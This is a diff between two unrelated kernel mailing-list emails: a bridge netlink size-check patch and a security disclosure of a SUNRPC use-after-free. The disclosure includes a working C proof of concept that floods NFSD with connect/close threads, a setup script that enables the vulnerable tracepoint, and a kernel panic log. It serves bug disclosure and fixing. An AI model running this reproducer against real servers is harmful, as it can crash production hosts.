@@ -1,95 +1,83 @@
-Received: from mail-lf2-f12.google.com (mail-lf2-f12.google.com [74.125.229.204])
+Received: from mail-pf1-f172.google.com (mail-pf1-f172.google.com [209.85.210.172])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8FA3033065C
-	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 13:50:39 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.204
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E08783290C7
+	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 13:56:23 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789221041; cv=none; b=VDeEaLRC4OKrfKD56bxp+aV926e/2F9c4BFpUmXr0hDHbZcMn6BxtTvIMvPpSJv5Uf2reTRT0XagTs6AGBad4Ff3v10pdiQ/Qt7yOn/QPDETMiQt9Muy0BiG+BmVmMWe03kRdNoUBFknJfgz4a3O1NoovZk1sk3pZWovf2PypXc=
+	t=1789221385; cv=none; b=jhr86x/FW56C8NI6UZh4HqIItJTSQGsDZ9wm8ztUs/QARiFf05GxWAwKb9ySRcnhpCnPUDfctr5Rdn2S7nnK5DUz4EIf7/VSKS/sfP11uG1Q0PY5/z0kmGJid7MhxQKDd/8EharI+ciNlxtI8hRX5rnKXtSi91xZgnoNbA2kDkM=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789221041; c=relaxed/simple;
-	bh=9JjWJlQanOFgNu6EDHV88ITYLaK2cjjVq8yIXb93bls=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=jJFuf040GLWwANLvXROHA56127RLtgbTJKalcywOwT74nwseL8wOeoInapiyFSVkGXtnnB7MQef1+wCV1H84yvpwkld/jwrq3WHuvNIP5s0Ij6MulyErv5EgjbmlbDXxENi8HzOXuj/RGfpZxEihPmflomX1rEHjMV6o2gbKGM0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=jIxZtyPP; arc=none smtp.client-ip=74.125.229.204
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1789221385; c=relaxed/simple;
+	bh=3Zmgdw0QDt5Fg7eG1DHFlfLM0BG26coxDtoMF6t7tKY=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=uSry4CnOTmG2KZgmTMPyu53dEOIyA1gjVngMqYaqGwR6SiQ1GVVeB4rTYgJhTjCNHNXs41jGTPM0OOosnfzU9KULI9yMi1hq2U7REJb6GqaczvLQ31oOvj/gtCSIs+EyB1Ht0GT9y/pwA+13xXLy894pPZWu+tyW3ZQgn43eqZk=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=HUmyHQXp; arc=none smtp.client-ip=209.85.210.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="jIxZtyPP"
-Received: by mail-lf2-f12.google.com with SMTP id 2adb3069b0e04-5b76462aae9so395942e87.2
-        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 06:50:39 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="HUmyHQXp"
+Received: by mail-pf1-f172.google.com with SMTP id d2e1a72fcca58-869d181419bso1796694b3a.2
+        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1789221037; x=1789825837; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=PkBUg+m8HfIyEOkPoB1jZJ5opS1mW8Hh1Xx4YggldGE=;
-        b=jIxZtyPPEr65upOAkpKscDsfcBWsGEzWsLYT6lpdZ65o2Gz3ppCtADdhhrFn0zmcLH
-         etydSLUfMrpIJjIxHYaOAnacEfnFlXPNV390x3rYHw58XUbV8SLTkwMO4ooEmNS0oYOd
-         HOYqq4AuZCNi3NSNZY5mJQozMU6Oh+HQL8DY/L0vsDM+F+D6YV5n3Fy0rzOvv3EiHTMo
-         NdZdG9udkfp0tUIxVzPWxfVh625oaqpiJdBLTMzOd01WRFZzmY7t4errwg5NbjBiatJM
-         eepk2shSZCVVFd1qTuUf4iDvijBFc0lKBD+ueehWdRURjFbJzqL4fLu4NNdJCF8xLPJR
-         Mf2w==
+        d=nebusec.ai; s=google; t=1789221383; x=1789826183; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
+        b=HUmyHQXp6q5Oe6Z95iqXKARhUJcainnBK9q9sJpvpNnoEjS8dYKZ/3cqlOGzufkgEj
+         nUPfGrG3dGr70E8jPeitEQJ17xnHhBNeG3WEdjCxVjJsaY1Wa3gTL2FxULdQ1T5rfa88
+         kUc3QGCkc6uhefoUKC82JB+XlmQAkNo1Gu4f0yE8dKrozSRGn23U2IpM8xebAoZXOvHQ
+         R0gmxrfCJ1PTyXtkYfS7xNNy11E9iM/7yUauS3dxPEaVN/OByz6R5hjPRAa5k2Z5l9r9
+         bEjzKC1UsmTL71oNKkIC3oU/7548d2gq0dOD/1xhiXaJ6nyE0I/eJ3nT5ba6iTcjs3Kt
+         vi5A==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1789221037; x=1789825837;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=PkBUg+m8HfIyEOkPoB1jZJ5opS1mW8Hh1Xx4YggldGE=;
-        b=Rx0vih89jt1oQi5kOp05IjWSEtEFfWOGsOrkucYhyxtxXkStLPHwvTrM/qGXy+RzCc
-         DeTV5QaJEwkY4A2CkRMA4xD/4g/pDA6waKkDvGVUWNx/1pLdvaFhVRR6f2RyeEYXAJ65
-         ciEnEXNdx3t28WhUCy9jbFYztU629KEKXvsh7OJkVk0d9wj+zra+PxtM/6tZuxq+d0oc
-         3HWLLjrjLJW9gRu4qiN4nwHIsYFJvDD54c+6ppbjMLDgMihlS+8ovt15pv8y7t6FIxKa
-         abyVG/pVx5nZ5RNu84raYpJgpAUjTTj6pCaTEUKSIyTrZW/01xHr6gLuKlKDwNqJNQv6
-         FAIQ==
-X-Gm-Message-State: AFuF++mxBF5TYgA1trX2E7NmgOVbDcHinT51tLG8b9wEg3vJw5QAtBzZ
-	bEjhmFVOEW36GS0J5GM1Q1oqqynvKivS6+WGYa+Zda0fy6saQPn1w+JYr8FLyAZ+Lr0=
-X-Gm-Gg: AYBFou0/U02J5M2Y96V+2lNsYMZ2+FLLVkxrV7Rkc/uk40KwJndBRckrnr5qh/2aJt6
-	S7IA3Vgj9ROJQoVZOOwc+5qfHULnP4DHH/OQTLp/4e9TUsTWoDoNypyYt6wJ8NE8ak4Shj6GO1R
-	jLraa/Lo5A4S5paNFGgKnk+Ja7rsTohZwb4psCsn9grU2+RUQmHDbCqRB7yf/YtMOv50BNI+/BK
-	fGmILrC1QP/z87BSkEK5n8HuBz6pWvlMr0Wf9PDNeXLZ9T/CTaqtCEghnQeBCiRW3JPoUxm9abk
-	9XffYropZv9BKuebdFnh4GHK6M+MYplkQerBNAsBG1KBj8GI/pBHAuJoTN2xFIMP+tIDue30ohK
-	+Z8eBV+KG3GkKlbsYPef0KI7SVkUjgvR9+GmR7pMTOZDvQfLmjPSRCHN9JyHySWxDutcfUhRflQ
-	GN2Hy800E/f35jBSZc51sDMFHn8I9CO5l/ynLDArhej9lVJ46rikQokZ26qVHugBRU6cv3tU0Sy
-	c4w+XGa4A8UX5YmNJEp2QKYAiKm80vr8fUaFq32musN9KpoUa/Efcty7EAhtk42Ijx0
-X-Received: by 2002:a05:6512:1594:b0:5b0:eda:de1c with SMTP id 2adb3069b0e04-5b8a8ea0818mr465882e87.5.1789221037446;
-        Sat, 12 Sep 2026 06:50:37 -0700 (PDT)
-Received: from localhost.localdomain (46-138-187-224.dynamic.spd-mgts.ru. [46.138.187.224])
-        by smtp.gmail.com with ESMTPSA id 2adb3069b0e04-5b8a0457246sm1257770e87.23.2026.09.12.06.50.36
+        d=1e100.net; s=20251104; t=1789221383; x=1789826183;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=ltE8hmOwdxEerL1lVsOCisOm4JARkEhCGeOYU3e883U=;
+        b=L/1Dtk3NqAWtEuSvGwjtFy9+y6upwc24dVlbNo59EriswSAS5TXuZKocCs/fxEH+Kv
+         JERjpCzam/xMQ86yoh6PGyUIP3MOcZi1GdSFiUeHL63vxKt5eI7YVU1C+yrZ5rplhpAL
+         m4qNUqd4r52FFiPwa7pJcgAQ7v3GldWge8vvqEogjm9kUfn6d1I6903ittIpa8OA4hVN
+         WQ7aj/aDShszzvZToEO11zfVLGp14VDB31/1MIRXx76qjjtiXnh34xMj7PnsMcWvzAvL
+         T73cpT8oEHYwak5C52nkiyyp/kMr3T7ARQd5HORO5GR4Af8W61BvGAj1iuBGDDYwdhz2
+         JLjw==
+X-Forwarded-Encrypted: i=1; AKwUvByIfzBpX1DWDbpumV12lWY/AcovWNy8Ss8a8pVIu0YCDaXxbusRIvvl7LxRoVlXvxo+k8/rEMk=@vger.kernel.org
+X-Gm-Message-State: AFuF++mokq3vbIfRA13QxbMPEvCWePY5GICA6RnGWYsTnTKZZzGawNfF
+	fNK/XmZ3L6HOm1NOSLWYRvH34GKm5arZ0hz/Lw4VYaoFB+QDDwdoY10BAcE4lS+e8yX/
+X-Gm-Gg: AYBFou3tOIzUxn9wrRrtSNxOw+bwJxypWRe7jWRSYYBI81gjmgvnxzfGCmuETk9CfQL
+	qELLAvvoB3BLjHz8HNqFe3AIdY2rYQSBG5dpy3dPh3IgomoYlPMYy1a4FdbCwhIagZ81zeZz+YZ
+	s3jP0DHnaVTWFGycMLzQI74Kx6eV/DVPNDXyHWJo9naxLNEuTsxTBJfMzWKgP3lCfUVrnpoK6Dw
+	iNore5wa/JyBSs2dkymfWlIdDeVIpNwmXYImd1sQdmV6GMAv2opT8XbzmTDq4BHJRWpwnWJmLfw
+	6tqlEN7q1efc9KQIyR4hhmpBZTow3hMkAMtDI4NtBcNCHUpMKcRespHJj0jmkxV9ma5tg58JuGq
+	kgt6mrVXbGfbXee96n2UOWVT+dkhokxrp+IXaUPjNVTmkQhcvaEP+Doc7R0rrAeYCysqhj0wN4S
+	WkIuwDCyAGKuaH3rlPgKxjReKAfPSpRTxMcReH1Uk4lfi98F3wgzdxVHrI25uvmRwJRrQBijq+Y
+	z7rqFI=
+X-Received: by 2002:a05:6a21:8cc4:b0:3cc:92d9:80cb with SMTP id adf61e73a8af0-3daed4edf77mr17451958637.12.1789221383106;
+        Sat, 12 Sep 2026 06:56:23 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33ba4f1e434sm13947833eec.22.2026.09.12.06.56.18
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 12 Sep 2026 06:50:37 -0700 (PDT)
-From: Artem Lytkin <iprintercanon@gmail.com>
-To: netdev@vger.kernel.org
-Cc: bridge@lists.linux.dev,
-	razor@blackwall.org,
-	idosch@nvidia.com,
+        Sat, 12 Sep 2026 06:56:22 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: linux-nfs@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: trondmy@kernel.org,
+	anna@kernel.org,
+	cel@kernel.org,
+	jlayton@kernel.org,
+	neil@brown.name,
+	okorniev@redhat.com,
+	Dai.Ngo@oracle.com,
+	tom@talpey.com,
 	davem@davemloft.net,
 	edumazet@google.com,
-	kuba@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	andrew+netdev@lunn.ch,
-	kuniyu@google.com,
-	michael.chan@broadcom.com,
-	pavan.chebbi@broadcom.com,
-	ajit.khaparde@broadcom.com,
-	sriharsha.basavapatna@broadcom.com,
-	anthony.l.nguyen@intel.com,
-	przemyslaw.kitszel@intel.com,
-	intel-wired-lan@lists.osuosl.org,
-	saeedm@nvidia.com,
-	tariqt@nvidia.com,
-	mbloch@nvidia.com,
-	oss-drivers@corigine.com,
-	wintera@linux.ibm.com,
-	aswin@linux.ibm.com,
-	linux-s390@vger.kernel.org
-Subject: [PATCH net-next v2 2/2] net: bridge: fail link info that does not fit the IFLA_AF_SPEC nest
-Date: Sat, 12 Sep 2026 16:50:22 +0300
-Message-ID: <20260912135022.1701-3-iprintercanon@gmail.com>
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net 0/1] SUNRPC: hold a reference while tracing accepted transports
+Date: Sat, 12 Sep 2026 21:56:08 +0800
+Message-ID: <cover.1789220778.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.43.0
-In-Reply-To: <20260912135022.1701-1-iprintercanon@gmail.com>
-References: <20260912135022.1701-1-iprintercanon@gmail.com>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -98,66 +86,250 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-br_fill_ifinfo() puts all of a port's VLAN, tunnel and MST entries into
-one nest, and nla_len is a u16, so a large enough port produces a nest
-whose length wraps and userspace reads garbage.
+Hi Linux kernel maintainers,
 
-Cancel the message and return -E2BIG with an extack pointing at
-RTM_GETVLAN instead. The dump retries the port with an empty skb and
-the error goes to userspace; notifications reach rtnl_set_sk_err() and
-listeners resync. Not -EMSGSIZE, since no bigger buffer would help.
+We found and validated an issue in net/sunrpc/svc_xprt.c. The bug is
+reachable by a root user through the NFSD listener and TCP connect path.
+We've tested it, and it should not affect any other functionality.
 
-Assisted-by: Claude:claude-opus-5
-Signed-off-by: Artem Lytkin <iprintercanon@gmail.com>
----
- net/bridge/br_netlink.c | 13 ++++++++++---
- 1 file changed, 10 insertions(+), 3 deletions(-)
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-diff --git a/net/bridge/br_netlink.c b/net/bridge/br_netlink.c
-index 855a46aec3a89..53676df9e4d11 100644
---- a/net/bridge/br_netlink.c
-+++ b/net/bridge/br_netlink.c
-@@ -459,7 +459,7 @@ static int br_fill_ifinfo(struct sk_buff *skb,
- 			  const struct net_bridge_port *port,
- 			  u32 pid, u32 seq, int event, unsigned int flags,
- 			  u32 filter_mask, const struct net_device *dev,
--			  bool getlink)
-+			  bool getlink, struct netlink_ext_ack *extack)
- {
- 	u8 operstate = netif_running(dev) ? READ_ONCE(dev->operstate) :
- 					    IF_OPER_DOWN;
-@@ -613,6 +613,12 @@ static int br_fill_ifinfo(struct sk_buff *skb,
- 
- done:
- 	if (af) {
-+		if (skb_tail_pointer(skb) - (unsigned char *)af > U16_MAX) {
-+			NL_SET_ERR_MSG_MOD(extack,
-+					   "VLAN information does not fit in one message, use RTM_GETVLAN");
-+			nlmsg_cancel(skb, nlh);
-+			return -E2BIG;
-+		}
- 		if (nlmsg_get_pos(skb) - (void *)af > nla_attr_size(0))
- 			nla_nest_end(skb, af);
- 		else
-@@ -654,7 +660,8 @@ void br_info_notify(int event, const struct net_bridge *br,
- 	if (skb == NULL)
- 		goto errout;
- 
--	err = br_fill_ifinfo(skb, port, 0, 0, event, 0, filter, dev, false);
-+	err = br_fill_ifinfo(skb, port, 0, 0, event, 0, filter, dev, false,
-+			     NULL);
- 	if (err < 0) {
- 		/* -EMSGSIZE implies BUG in br_nlmsg_size() */
- 		WARN_ON(err == -EMSGSIZE);
-@@ -693,7 +700,7 @@ int br_getlink(struct sk_buff *skb, u32 pid, u32 seq,
- 		return 0;
- 
- 	return br_fill_ifinfo(skb, port, pid, seq, RTM_NEWLINK, nlflags,
--			      filter_mask, dev, true);
-+			      filter_mask, dev, true, extack);
- }
- 
- static int br_vlan_info(struct net_bridge *br, struct net_bridge_port *p,
+---- details below ----
+
+Bug details:
+
+svc_handle_xprt() publishes a newly accepted transport with
+svc_add_new_temp_xprt() before calling trace_svc_xprt_accept(). Publishing
+the transport clears XPT_BUSY and allows another service worker to close
+and free it immediately.
+
+The tracepoint then dereferences the accepted transport without holding a
+reference. A concurrent connect-and-close sequence can therefore make the
+tracepoint read freed transport fields, including the addresses, flags,
+class, and network namespace.
+
+The fix takes an extra reference before publishing the transport and
+releases it after trace_svc_xprt_accept() returns.
+
+Reproducer:
+
+    make
+    sh ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+    #define _GNU_SOURCE
+    #include <arpa/inet.h>
+    #include <errno.h>
+    #include <netinet/in.h>
+    #include <pthread.h>
+    #include <signal.h>
+    #include <stdatomic.h>
+    #include <stdbool.h>
+    #include <stdint.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <sys/socket.h>
+    #include <sys/time.h>
+    #include <sys/types.h>
+    #include <time.h>
+    #include <unistd.h>
+
+    static atomic_bool stop_flag = false;
+    static atomic_ulong attempts = 0;
+    static atomic_ulong connects = 0;
+    static atomic_ulong errs = 0;
+
+    struct worker_args {
+    	struct sockaddr_in addr;
+    };
+
+    static void on_signal(int sig)
+    {
+    	(void)sig;
+    	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    }
+
+    static void *worker(void *arg)
+    {
+    	struct worker_args *w = arg;
+    	struct linger ling = {
+    		.l_onoff = 1,
+    		.l_linger = 0,
+    	};
+
+    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+    		int fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+    		if (fd < 0) {
+    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
+    			continue;
+    		}
+
+    		setsockopt(fd, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
+    		atomic_fetch_add_explicit(&attempts, 1, memory_order_relaxed);
+    		if (connect(fd, (struct sockaddr *)&w->addr, sizeof(w->addr)) == 0)
+    			atomic_fetch_add_explicit(&connects, 1, memory_order_relaxed);
+    		else if (errno != ECONNREFUSED && errno != ECONNRESET &&
+    			 errno != ETIMEDOUT && errno != EHOSTUNREACH &&
+    			 errno != ENETUNREACH)
+    			atomic_fetch_add_explicit(&errs, 1, memory_order_relaxed);
+
+    		close(fd);
+    	}
+
+    	return NULL;
+    }
+
+    int main(int argc, char **argv)
+    {
+    	struct worker_args args = {
+    		.addr = {
+    			.sin_family = AF_INET,
+    			.sin_port = htons(2049),
+    		},
+    	};
+    	pthread_t *threads;
+    	unsigned int nthreads = 64;
+    	unsigned int seconds = 0;
+    	time_t start = time(NULL);
+
+    	if (argc > 1)
+    		nthreads = strtoul(argv[1], NULL, 0);
+    	if (argc > 2)
+    		seconds = strtoul(argv[2], NULL, 0);
+    	if (argc > 3 && inet_pton(AF_INET, argv[3], &args.addr.sin_addr) != 1) {
+    		fprintf(stderr, "bad IPv4 address: %s\n", argv[3]);
+    		return 1;
+    	}
+    	if (argc <= 3)
+    		inet_pton(AF_INET, "127.0.0.1", &args.addr.sin_addr);
+
+    	signal(SIGINT, on_signal);
+    	signal(SIGTERM, on_signal);
+
+    	threads = calloc(nthreads, sizeof(*threads));
+    	if (!threads) {
+    		perror("calloc");
+    		return 1;
+    	}
+
+    	for (unsigned int i = 0; i < nthreads; i++) {
+    		if (pthread_create(&threads[i], NULL, worker, &args) != 0) {
+    			perror("pthread_create");
+    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    			nthreads = i;
+    			break;
+    		}
+    	}
+
+    	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+    		sleep(1);
+    		fprintf(stderr,
+    			"elapsed=%lds attempts=%lu connects=%lu errs=%lu\n",
+    			(long)(time(NULL) - start),
+    			atomic_load_explicit(&attempts, memory_order_relaxed),
+    			atomic_load_explicit(&connects, memory_order_relaxed),
+    			atomic_load_explicit(&errs, memory_order_relaxed));
+    		if (seconds && (unsigned int)(time(NULL) - start) >= seconds)
+    			atomic_store_explicit(&stop_flag, true, memory_order_relaxed);
+    	}
+
+    	for (unsigned int i = 0; i < nthreads; i++)
+    		pthread_join(threads[i], NULL);
+    	free(threads);
+    	return 0;
+    }
+
+------END poc.c--------
+
+------BEGIN poc.sh------
+
+    #!/bin/sh
+    set -eu
+
+    cd "$(dirname "$0")"
+
+    mountpoint -q /proc/fs/nfsd || mount -t nfsd nfsd /proc/fs/nfsd
+    printf -- "-3 +4 +4.1 +4.2\n" > /proc/fs/nfsd/versions
+    printf "tcp 2049\n" > /proc/fs/nfsd/portlist
+    printf "8\n" > /proc/fs/nfsd/threads
+    printf "0" > /proc/sys/kernel/panic_on_warn
+    printf "1" > /sys/kernel/tracing/events/sunrpc/svc_xprt_accept/enable
+
+    exec ./poc 128 180
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  333.976492][ T1246] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
+[  333.977355][ T1246] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
+[  333.977921][ T1246] CPU: 0 UID: 0 PID: 1246 Comm: nfsd Tainted: G    B              6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  333.978690][ T1246] Tainted: [B]=BAD_PAGE
+[  333.978970][ T1246] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  333.979739][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
+[  333.980242][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
+[  333.981476][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
+[  333.981879][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
+[  333.982391][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
+[  333.982899][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
+[  333.983401][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
+[  333.983948][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
+[  333.984458][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  333.985059][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  333.985486][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
+[  333.986017][ T1246] PKRU: 55555554
+[  333.986254][ T1246] Call Trace:
+[  333.986469][ T1246]  <TASK>
+[  333.986668][ T1246]  do_trace_event_raw_event_svc_xprt_accept+0xce/0x5d0
+[  333.987112][ T1246]  ? __pfx_do_trace_event_raw_event_svc_xprt_accept+0x10/0x10
+[  333.987582][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.987949][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.988320][ T1246]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  333.988686][ T1246]  ? kasan_quarantine_put+0xcc/0x1d0
+[  333.989350][ T1246]  svc_recv+0x1d74/0x2520
+[  333.989649][ T1246]  nfsd+0x2f1/0x440
+[  333.989900][ T1246]  ? __pfx_nfsd+0x10/0x10
+[  333.990185][ T1246]  kthread+0x2bd/0x3a0
+[  333.990451][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.990750][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.991046][ T1246]  ret_from_fork+0x31/0x70
+[  333.991329][ T1246]  ? __pfx_kthread+0x10/0x10
+[  333.991632][ T1246]  ret_from_fork_asm+0x1a/0x30
+[  333.991958][ T1246]  </TASK>
+[  333.992156][ T1246] Modules linked in:
+[  333.992461][ T1246] ---[ end trace 0000000000000000 ]---
+[  333.992828][ T1246] RIP: 0010:trace_event_get_offsets_svc_xprt_accept+0x101/0x2e0
+[  333.993321][ T1246] Code: 00 00 00 00 fc ff df 48 c1 ea 03 80 3c 02 00 0f 85 c3 01 00 00 48 b8 00 00 00 00 00 fc ff df 4c 8b 75 00 4c 89 f2 48 c1 ea 03 <80> 3c 02 00 0f 85 b1 01 00 00 49 8b 3e 48 c7 c0 40 ff 11 87 45 8d
+[  333.994585][ T1246] RSP: 0018:ffffc90003487c98 EFLAGS: 00010256
+[  333.994975][ T1246] RAX: dffffc0000000000 RBX: ffffc90003487d70 RCX: 0000000000000000
+[  333.995510][ T1246] RDX: 0000000000000000 RSI: 0000000000000008 RDI: ffffc90003487c60
+[  333.996041][ T1246] RBP: ffff88810948c000 R08: 0000000000000001 R09: fffffbfff162a4dc
+[  333.996546][ T1246] R10: ffffffff8b1526e7 R11: ffffffff8868e950 R12: 0000000000000020
+[  333.997104][ T1246] R13: ffffffff8696cb80 R14: 0000000000000000 R15: 0000000000100034
+[  333.997621][ T1246] FS:  0000000000000000(0000) GS:ffff888119a00000(0000) knlGS:0000000000000000
+[  333.998216][ T1246] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  333.998627][ T1246] CR2: 00007c23a67c3f78 CR3: 0000000109790003 CR4: 0000000000770ef0
+[  333.999145][ T1246] PKRU: 55555554
+[  333.999377][ T1246] Kernel panic - not syncing: Fatal exception
+[  333.999901][ T1246] Kernel Offset: disabled
+[  334.000176][ T1246] Rebooting in 10 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  SUNRPC: hold a reference while tracing accepted transports
+
+ net/sunrpc/svc_xprt.c | 2 ++
+ 1 file changed, 2 insertions(+)
+
 -- 
 2.43.0
 
